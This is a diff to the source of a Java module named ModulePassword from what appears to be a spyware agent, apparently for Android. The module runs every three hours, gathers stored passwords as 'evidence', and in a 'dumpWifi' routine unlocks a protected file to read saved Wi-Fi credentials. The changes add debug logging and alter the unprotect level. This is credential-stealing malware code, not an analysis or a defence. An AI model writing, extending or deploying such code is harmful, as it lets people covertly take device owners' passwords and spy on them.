@@ -54,6 +54,9 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualStart() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualStart) ");
+		}
 		// every three hours, check.
 		setPeriod(180 * 60 * 1000);
 		setDelay(200);
@@ -64,7 +67,10 @@ public class ModulePassword extends BaseModule {
 
 	@Override
 	protected void actualGo() {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualGo) ");
+		}
+		
 		RecordVisitor passwordVisitor = new RecordVisitor() {
 			EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
 			boolean needToSerialize = false;
@@ -120,7 +126,7 @@ public class ModulePassword extends BaseModule {
 			File file = new File(filename);
 			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
 		}
-		if (!Path.unprotect(filename, 2, false)) {
+		if (!Path.unprotect(filename, 3, false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (dumpWifi) no passwords found");
 			}
